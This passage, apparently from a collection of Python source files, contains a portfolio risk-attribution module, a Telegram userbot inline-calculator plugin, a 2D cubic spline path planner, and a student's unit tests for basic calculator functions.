Guid(allow_none=True)\n\n    def __init__(self,\n                 appName=None,\n                 lastEdited=None,\n                 lowestEdited=None,\n                 rupBuild=None,\n                 codeName=None,\n                ):\n        self.appName = appName\n        self.lastEdited = lastEdited\n        self.lowestEdited = lowestEdited\n        self.rupBuild = rupBuild\n        self.codeName = codeName\n", "367": "# coding: utf-8\nfrom lib.gftTools import gftIO\n\n\nfrom lib.gftTools import gftIO\nfrom lib.gftTools import gsConst\nimport numpy as np\nimport pandas as pd\nfrom functools import reduce\nimport math as mt\n\nclass Riskreport(object):\n    def __init__(self,df_expo,df_w,df_covm,df_specrisk,ls_industryfactor,ls_stylefactor):\n        self.df_expo=df_expo\n        self.df_w=df_w\n        self.df_covm=df_covm\n        self.df_specrisk=df_specrisk\n        self.ls_industryfactor=ls_industryfactor\n        self.ls_stylefactor=ls_stylefactor\n\n    def calcX(self):\n        return (self.df_expo.T).dot(self.df_w)\n\n    def calcPortCommonRisk(self):\n        self.calcX()[np.isnan(self.calcX())]=0\n        return float((((self.calcX().T).dot(self.df_covm)).dot(self.calcX())).ix[0,0])\n\n    def calcPortSpecificRisk(self):\n        return float((((self.df_w.T).dot(self.df_specrisk)).dot(self.df_w)).ix[0,0])\n\n    def calcTotalRisk(self):\n        return (self.calcPortCommonRisk()+self.calcPortSpecificRisk())\n\n    def calcSigmaRisk(self):\n        return (mt.sqrt(self.calcTotalRisk()))\n\n    def calcTotalRiskall(self,f_varp,columnname):\n        f_var =self.calcTotalRisk()\n        f_sigma = self.calcSigmaRisk()\n        try:\n            f_percent = f_var/f_varp\n        except:\n            f_percent=np.nan\n        df_riskall = pd.DataFrame(data=([[f_var,f_sigma,f_percent]]),columns=columnname)\n        return df_riskall\n\n    def calcFMCR(self):\n        try:\n            xpa =self.calcX()\n            xpa[np.isnan(xpa)]=0\n            df_allcovm =self.df_covm\n            ls_allfactor=self.ls_industryfactor+self.ls_stylefactor\n\n            dict_factorcontrib = [pd.DataFrame(data=float((((xpa.T[[i]]).dot(df_allcovm[df_allcovm.index == i])).dot(xpa)).ix[0,0]),index=[i],columns=['value'])  for i in ls_allfactor]\n            df_fmcar=pd.concat(dict_factorcontrib,axis=0)\n\n            df_sigmafmcar=pd.DataFrame(df_fmcar['value'].apply(lambda x:np.sqrt(x) if x>= 0 else np.nan))\n\n            df_fmcar_raw=self.df_covm.dot(self.calcX())/self.calcSigmaRisk()\n            df_percenfmcar = self.calcX() * df_fmcar_raw/self.calcSigmaRisk()\n\n            df_fmcar.rename(columns={'value':'FMCAR'},inplace=True)\n            df_sigmafmcar.rename(columns={'value':'sigmaFMCAR'},inplace=True)\n            df_percenfmcar.rename(columns={'Wa':'percenFMCAR'},inplace=True)\n            df_fmcarall=pd.concat([df_fmcar,df_sigmafmcar,df_percenfmcar],axis=1)\n\n            return df_fmcarall\n        except:\n            return np.nan\n\n    def calcIndustryFMCAR(self):\n        return (self.calcFMCR().reindex(self.ls_industryfactor))\n\n    def calcstyleFMCAR(self):\n        return (self.calcFMCR().reindex(self.ls_stylefactor))\n\n    def calcPortCommonRiskall(self,f_vara,indexname):\n        f_varfactor = self.calcPortCommonRisk()\n        f_sigmafactor = mt.sqrt(f_varfactor)\n        try:\n            f_percenfactor = f_varfactor/f_vara\n        except:\n            f_percenfactor=np.nan\n\n        df_factor=pd.DataFrame(data=[[f_varfactor,f_sigmafactor,f_percenfactor]],columns=['VarFactor','sigmaFactor','percenFactor'])\n        return df_factor\n\n    def calcPortSpecRiskall(self,f_vara,indexname):\n        f_varss = self.calcPortSpecificRisk()\n        f_sigmass = mt.sqrt(f_varss)\n        try:\n            f_percenss = f_varss/f_vara\n        except:\n            f_percenss=np.nan\n\n        df_ss=pd.DataFrame(data=[[f_varss,f_sigmass,f_percenss]],columns=['VarSS','sigmaSS','percenSS'])\n        return df_ss\n\nclass Riskmodel(object):\n\n    def __init__(self,data,dt_selecteddate,allsymbol):\n        self.data=data\n        self.selectedate=dt_selecteddate\n        self.allsymbol=allsymbol\n\n    def getfactorlist(self,i):\n        return (self.data[gftIO.gidInt2Str(self.data['osets'].asColumnTab().ix[i,0])].asColumnTab()['O0']).apply(lambda x:gftIO.gidInt2Str(x)).tolist()\n\n    def factorcnt(self):\n        return len(self.data['osets'].asColumnTab())\n\n    def getallFactor(self):\n        allfactor=[]\n        for i in range(self.factorcnt()):\n            allfactor.extend(self.getfactorlist(i))\n        return allfactor\n\n    def selectData(self):\n        dict_fexpo=dict([(factorname,self.data[factorname].asMatrix().reindex(columns=self.allsymbol)) for factorname in self.getallFactor()])\n        return dict_fexpo\n\n    def Fexpomerge(self):\n        dt_latest = self.selectedate\n        ls_raw_df_fexpo=[self.selectData()[factorname].reindex(index=[dt_latest]).rename(index={dt_latest:factorname}) for factorname in self.getallFactor()]\n        df_fexpo_onedate=pd.concat(ls_raw_df_fexpo,axis=0).fillna(0)\n        df_fexpo_onedate.index=list(gftIO.strSet2Np(np.array(df_fexpo_onedate.index)))\n        return df_fexpo_onedate.T\n\ndef calcRiskAttribution(dict_riskmodel,df_portwgt, df_benchwgt, dt_startdate,dt_enddate):\n    ########################step1:parameter description########################\n\n\n    #dict_riskmodel:type:dict:dict_riskmodel=x0\n    #df_portwgt:type:dataframe df_portwgt=x1\n    #df_benchwgt:type:dataframe  df_benchwgt=x2\n    #dt_startdate:type:timestamp:dt_startdate=x3\n    #dt_enddate type:dt_enddate =x4\n\n\n\n    ########################step2:portfolio,benchmark,portfolio active data prepare########################\n\n    ##part1:get portfolio,benchmark,portfolio active weight\n    df_wp =df_portwgt.asColumnTab().rename(columns={'value':'Wp'})\n    df_wb =df_benchwgt.asColumnTab().rename(columns={'value':'Wb'})\n    df_wa=pd.merge(df_wp,df_wb,on=['idname','variable'],how='outer')\n    df_wa.fillna(0,inplace=True)\n    df_wa.set_index('variable',inplace=True)\n    df_wa['Wa']=df_wa['Wp']-df_wa['Wb']\n    ##part2:get portfolio,benchmark,portfolio active stock pool\n    ls_aname=list(set(df_portwgt.asMatrix().columns).union(set(df_benchwgt.asMatrix().columns)))\n    ls_aname.remove('idname')\n\n\n\n\n    ########################step2:data preprocessing########################\n    ##part1:date preprocessing\n    ##get factor name\n    rmodelobj=Riskmodel(dict_riskmodel,dt_startdate,ls_aname)\n\n    if rmodelobj.factorcnt() < 2:\n        ls_stylefactor=list(gftIO.strSet2Np(np.array(rmodelobj.getfactorlist(0))))\n        ls_industryfactor=[]\n    else:\n        ls_industryfactor = list(gftIO.strSet2Np(np.array(rmodelobj.getfactorlist(0))))\n        ls_stylefactor=list(gftIO.strSet2Np(np.array(rmodelobj.getfactorlist(1))))\n\n    ls_allfactor=list(gftIO.strSet2Np(np.array(rmodelobj.getallFactor())))\n\n\n    ##part2:factor loading preprocessing\n    dict_risk_expo_new = {factorname: dict_riskmodel[factorname].asMatrix().dropna(how='all') for factorname in list(np.array(rmodelobj.getallFactor()))}\n    ls_ls_fexpodate=list([dict_risk_expo_new[factorname].index.tolist() for factorname in dict_risk_expo_new.keys()])\n    ls_alldates_fexpo=reduce(np.intersect1d,ls_ls_fexpodate)\n\n\n\n\n    ##part3:covM preprocessing\n    df_covm = dict_riskmodel['ret_cov']##factor covariance matrix\n    df_covm=df_covm.reset_index().reindex(columns=['factorid1','factorid2','value','date'])\n\n    df_covm=df_covm[df_covm['factorid1'].isin(ls_allfactor)][df_covm['factorid2'].isin(ls_allfactor)]\n\n\n\n    ##part4:specRisk preprocessing\n    df_specrisk_raw = dict_riskmodel['specificRisk']\n\n    ## make sure all the data source have the same date range\n    #ls_date_range_new=list(pd.period_range(dt_startdate, dt_enddate, freq='D').to_timestamp()) ##for date range check\n    #df_date_range=pd.DataFrame(data=ls_date_range_new,columns=['needdate'])\n\n\n    ls_port_wgt=df_portwgt.asMatrix().index\n\n    sourceDates=sorted(list(ls_port_wgt[(ls_port_wgt <= dt_enddate) & (ls_port_wgt >= dt_startdate)]))\n\n\n\n    ###align daterange\n    ##covm specrisk align\n    targetDates=sorted(list(np.unique(df_covm['date'])))\n    df_date_map_covm = pd.DataFrame({'targetDate':targetDates}, index=targetDates)\n    df_date_map_covm = df_date_map_covm.reindex(sourceDates, method='ffill').dropna(how='any')\n    dict_date_map_covm={df_date_map_covm.index[i]:df_date_map_covm.targetDate[i] for i in range(len(df_date_map_covm))}\n\n\n\n\n    ##factor align\n    targetDates=sorted(list(ls_alldates_fexpo))\n    df_date_map_expo = pd.DataFrame({'targetDate':targetDates}, index=targetDates)\n    df_date_map_expo = df_date_map_expo.reindex(sourceDates, method='ffill').dropna(how='any')\n    dict_date_map_expo={df_date_map_expo.index[i]:df_date_map_expo.targetDate[i] for i in range(len(df_date_map_expo))}\n\n\n\n\n    ls_date_range=list(set(dict_date_map_covm.keys()).intersection(set(dict_date_map_expo.keys())))\n\n    if len(ls_date_range) == 0:\n        raise Exception(\"date length is null,risk model and risk decom didn't match\")\n\n    ##covm\n    dict_df_covm=dict([(dt_selecteddate,df_covm[df_covm['date'] == dict_date_map_covm[dt_selecteddate]].pivot_table(values='value', index='factorid1', columns='factorid2')) for dt_selecteddate in ls_date_range])\n\n\n    ##specrisk\n    df_specrisk_raw=df_specrisk_raw.reset_index().pivot('date','symbol','specificrisk')\n    df_specrisk_raw1=df_specrisk_raw.reindex(columns=ls_aname).T\n    df_specrisk= df_specrisk_raw1.fillna(df_specrisk_raw1.mean(axis=0,skipna=True))\n    dict_df_specrisk={date:pd.DataFrame(np.diag(df_specrisk[dict_date_map_covm[date]].tolist()),index=ls_aname,columns=ls_aname) for date in ls_date_range}\n\n\n    ##weight\n    dict_df_wa={date:df_wa[df_wa.idname == date].reindex(ls_aname).fillna(0) for date in ls_date_range}\n\n\n    ##factor exposure\n    dict_rmodelobj=dict([(dt_selecteddate,Riskmodel(dict_riskmodel,dict_date_map_expo[dt_selecteddate],ls_aname)) for dt_selecteddate in ls_date_range])\n    dict_df_fexpo =dict([(dt_selecteddate,dict_rmodelobj[dt_selecteddate].Fexpomerge()) for dt_selecteddate in dict_rmodelobj.keys()])\n    dict_final_return={}\n\n    ##create date-strdate dictionary\n    for date in ls_date_range:\n        ##part4:slice portfolio active\u00e7\u0161\u201e specific risk\n        df_specriska_singledate=dict_df_specrisk[date].fillna(0)\n        df_wa_singledate=dict_df_wa[date]\n        df_covm_singledate=dict_df_covm[date]\n        dict_df_fexpo_singledate=dict_df_fexpo[date]\n        ##part5:calculate portfolio,benchmark,portfolio active risk\n\n\n        p_riskreport=Riskreport(dict_df_fexpo_singledate,df_wa_singledate[['Wp']],df_covm_singledate,df_specriska_singledate,ls_industryfactor,ls_stylefactor)\n        b_riskreport=Riskreport(dict_df_fexpo_singledate,df_wa_singledate[['Wb']],df_covm_singledate,df_specriska_singledate,ls_industryfactor,ls_stylefactor)\n        a_riskreport=Riskreport(dict_df_fexpo_singledate,df_wa_singledate[['Wa']],df_covm_singledate,df_specriska_singledate,ls_industryfactor,ls_stylefactor)\n\n        ##portfolio total risk\n        f_varp =p_riskreport.calcTotalRisk()\n        f_vara =a_riskreport.calcTotalRisk()\n        ##interaction risk\n        f_varinter = f_varp - b_riskreport.calcTotalRisk() - f_vara\n        if f_varinter < 0:\n            f_sigmainter=np.nan\n        else:\n            f_sigmainter = mt.sqrt(f_varinter)\n\n        try:\n            f_perceninter = f_varinter/f_varp\n        except:\n            f_perceninter=np.nan\n\n        df_inter = pd.DataFrame(data=([[f_varinter,f_sigmainter,f_perceninter]]),columns=['VarInter','sigmaInter','percenInter'])\n\n        xpa =a_riskreport.calcX()\n        xpa[np.isnan(xpa)]=0\n        df_allcovm =a_riskreport.df_covm\n        dict_factorcontrib = [pd.DataFrame(data=float((((xpa.T[[i]]).dot(df_allcovm[df_allcovm.index == i])).dot(xpa)).ix[0,0]),index=[i],columns=['value'])  for i in ls_allfactor]\n        df_l_factorcontrib=pd.concat(dict_factorcontrib,axis=0)\n\n        if len(ls_industryfactor) >0:\n            df_TotIndustryFMCAR=pd.DataFrame(data=df_l_factorcontrib.reindex(index=ls_industryfactor).sum(),columns=['FMCAR'])\n            df_TotIndustryFMCAR['percenFMCAR']=df_TotIndustryFMCAR['FMCAR']/a_riskreport.calcTotalRisk()\n            if df_TotIndustryFMCAR['FMCAR'][0] >= 0:\n                df_TotIndustryFMCAR['sigmaFMCAR'] = np.sqrt(df_TotIndustryFMCAR['FMCAR'][0])\n            else:\n                df_TotIndustryFMCAR['sigmaFMCAR']=np.nan\n\n            df_TotStyleFMCAR=pd.DataFrame(data=df_l_factorcontrib.reindex(index=ls_stylefactor).sum(),columns=['FMCAR'])\n            df_TotStyleFMCAR['percenFMCAR']=df_TotStyleFMCAR['FMCAR']/a_riskreport.calcTotalRisk()\n            if df_TotStyleFMCAR['FMCAR'][0] >= 0:\n                df_TotStyleFMCAR['sigmaFMCAR'] = np.sqrt(df_TotStyleFMCAR['FMCAR'][0])\n            else:\n                df_TotStyleFMCAR['sigmaFMCAR']=np.nan\n\n\n            dict_final_return[date]= {gsConst.Const.PortRisk:p_riskreport.calcTotalRiskall(f_varp,['VarP','sigmaP','percentP']),gsConst.Const.BenchmarkRisk:b_riskreport.calcTotalRiskall(f_varp,['VarB','sigmaB','percentB']),\n    gsConst.Const.PortActiveRisk:a_riskreport.calcTotalRiskall(f_varp,['VarA','sigmaA','percentA']),gsConst.Const.InteractionRisk:df_inter,gsConst.Const.FactorRisk:a_riskreport.calcPortCommonRiskall(f_vara,['VarFactor','sigmaFactor','percenFactor']),\n                   gsConst.Const.SpecificRisk:a_riskreport.calcPortSpecRiskall(f_vara,['VarSS','sigmaSS','percenSS']),gsConst.Const.IndustryFMCAR:a_riskreport.calcIndustryFMCAR().reset_index(),gsConst.Const.StyleFMCAR:a_riskreport.calcstyleFMCAR().reset_index(),\n                   gsConst.Const.IndStyleFMCAR:a_riskreport.calcFMCR().reset_index(),gsConst.Const.PortExpo:p_riskreport.calcX().reset_index(),gsConst.Const.BenchmarkExpo:b_riskreport.calcX().reset_index(),\n\n                   gsConst.Const.PortExpoInd:p_riskreport.calcX().reindex(index=ls_industryfactor).reset_index(),gsConst.Const.PortExpoSty:p_riskreport.calcX().reindex(index=ls_stylefactor).reset_index(),\n                   gsConst.Const.BenchmarkExpoInd:b_riskreport.calcX().reindex(index=ls_industryfactor).reset_index(),gsConst.Const.BenchmarkExpoSty:b_riskreport.calcX().reindex(index=ls_stylefactor).reset_index(),\n                   gsConst.Const.TotIndustryFMCAR:df_TotIndustryFMCAR,gsConst.Const.TotStyleFMCAR:df_TotStyleFMCAR\n\n                   }\n        else:\n\n            df_TotStyleFMCAR=pd.DataFrame(data=df_l_factorcontrib.reindex(index=ls_stylefactor).sum(),columns=['FMCAR'])\n            df_TotStyleFMCAR['percenFMCAR']=df_TotStyleFMCAR['FMCAR']/a_riskreport.calcTotalRisk()\n            if df_TotStyleFMCAR['FMCAR'][0] >= 0:\n                df_TotStyleFMCAR['sigmaFMCAR'] = np.sqrt(df_TotStyleFMCAR['FMCAR'][0])\n            else:\n                df_TotStyleFMCAR['sigmaFMCAR']=np.nan\n\n\n\n            dict_final_return[date]= {gsConst.Const.PortRisk:p_riskreport.calcTotalRiskall(f_varp,['VarP','sigmaP','percentP']),gsConst.Const.BenchmarkRisk:b_riskreport.calcTotalRiskall(f_varp,['VarB','sigmaB','percentB']),\n    gsConst.Const.PortActiveRisk:a_riskreport.calcTotalRiskall(f_varp,['VarA','sigmaA','percentA']),gsConst.Const.InteractionRisk:df_inter,gsConst.Const.FactorRisk:a_riskreport.calcPortCommonRiskall(f_vara,['VarFactor','sigmaFactor','percenFactor']),\n                   gsConst.Const.SpecificRisk:a_riskreport.calcPortSpecRiskall(f_vara,['VarSS','sigmaSS','percenSS']),gsConst.Const.StyleFMCAR:a_riskreport.calcstyleFMCAR().reset_index(),\n                   gsConst.Const.IndStyleFMCAR:a_riskreport.calcFMCR().reset_index(),gsConst.Const.PortExpo:p_riskreport.calcX().reset_index(),gsConst.Const.BenchmarkExpo:b_riskreport.calcX().reset_index(),\n\n                   gsConst.Const.TotStyleFMCAR:df_TotStyleFMCAR\n\n                   }\n\n\n\n\n    dict_final_return_new={}\n    for i in list(dict_final_return[ls_date_range[0]].keys()):\n        ls_final_return=[dict_final_return[date][i].assign(date=date) for date in ls_date_range]\n        dict_final_return_new[i]=pd.concat(ls_final_return,axis=0)\n\n\n\n\n    return dict_final_return_new\n\n\n\n\n\n\n\n\n\nfrom lib.gftTools import gftIO\ndef debug__gsWrapper__():\n    context = gftIO.zload(\"/home/gft/data/context.pkl\")\n    x0 = gftIO.zload(\"/home/gft/data/x0.pkl\")\n    x1 = gftIO.zload(\"/home/gft/data/x1.pkl\")\n    x2 = gftIO.zload(\"/home/gft/data/x2.pkl\")\n    x3 = gftIO.zload(\"/home/gft/data/x3.pkl\")\n    x4 = gftIO.zload(\"/home/gft/data/x4.pkl\")\n    __gsWrapper__(context, x0, x1, x2, x3, x4)\n\n\n\n\nget_ipython().magic('debug debug__gsWrapper__()')\n\n\n# In[43]:\n\nfrom lib.gftTools import gftIO\n\n\n\n\n\n\n\n# In[44]:\n\ncontext = gftIO.zload(\"/home/gft/data/context.pkl\")\nx0 = gftIO.zload(\"/home/gft/data/x0.pkl\")\nx1 = gftIO.zload(\"/home/gft/data/x1.pkl\")\nx2 = gftIO.zload(\"/home/gft/data/x2.pkl\")\nx3 = gftIO.zload(\"/home/gft/data/x3.pkl\")\nx4 = gftIO.zload(\"/home/gft/data/x4.pkl\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n# In[45]:\n\ndict_riskmodel=x0\ndf_portwgt=x1\ndf_benchwgt=x2\ndt_startdate=x3\ndt_enddate =x4\n", "368": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "369": "\"\"\"\nCubic spline planner\n\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():  # pragma: no cover\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n    ds = 0.1  # [m] distance of each intepolated points\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], ds)\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    plt.subplots(1)\n    plt.plot(s, [np.rad2deg(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "370": "# Name: Paul Prew\n# Student Number: 10354828\n# Programming for Big Data\n# CA 1\n\n\n# The following are a suite of unit tests that are designed to test \n# each of the functions created in the program file named 'functions_calculator.py'. \n# Unit tests are created to test performance for a range of numeric input values,\n# including positive/negative numbers and whole/fractional numbers. Tests are also \n# included for exception results and value errors.\n# Note: Tests are not included for input values that are non-numeric, as the \n# input validation logic in the app program ensures that only numreric values are entered.\n\n\nimport unittest\n\nfrom functions_calculator import *\n\nclass CalculatorTest(unittest.TestCase):\n    def testAdd(self):\n        self.assertEqual(calc_add(2,2), 4)\n        self.assertEqual(calc_add(8,3), 11)\n        self.assertEqual(calc_add(-6,20), 14)\n        self.assertEqual(calc_add(-8,-12), -20)\n        self.assertEqual(calc_add(4,-9), -5)\n        self.assertEqual(calc_add(8.68, 7.256), 15.936)\n        \n    def testSubtract(self):  \n        self.assertEqual(calc_subtract(8,3), 5)\n        self.assertEqual(calc_subtract(3,5), -2)\n        self.assertEqual(calc_subtract(4,-9), 13)\n        self.assertEqual(calc_subtract(-6,20), -26)\n        self.assertEqual(calc_subtract(-8,-12), 4)\n        self.assertAlmostEqual(calc_subtract(8.68, 7.256), 1.424)\n                    \n    def testMultiply(self):  \n        self.assertEqual(calc_multiply(5,3), 15)\n        self.assertEqual(calc_multiply(4,-2), -8)\n        self.assertEqual(calc_multiply(-4,6), -24)  \n        self.assertEqual(calc_multiply(-7,-8), 56) \n        self.assertEqual(calc_multiply(6,0), 0) \n        self.assertEqual(calc_multiply(0,6), 0)      \n        \n    def testDivide(self):\n        self.assertEqual(calc_divide(8,2), 4)\n        self.assertEqual(calc_divide(10,-2), -5)\n        self.assertEqual(calc_divide(-32,4), -8)\n        self.assertEqual(calc_divide(-10,-2), 5)        \n        self.assertEqual(calc_divide(25.0, 2),12.5) \n        self.assertAlmostEqual(calc_divide(12.45,3.87), 3.21705426) \n        self.assertEqual(calc_divide(4,0), 'Divide by Zero Error!') \n       \n    def testExp(self):\n        self.assertEqual(calc_exp(5,2), 25)\n        self.assertEqual(calc_exp(5,3), 125)\n        self.assertEqual(calc_exp(2,4), 16) \n        self.assertEqual(calc_exp(-2,4), 16)\n        self.assertEqual(calc_exp(3,0), 1)\n        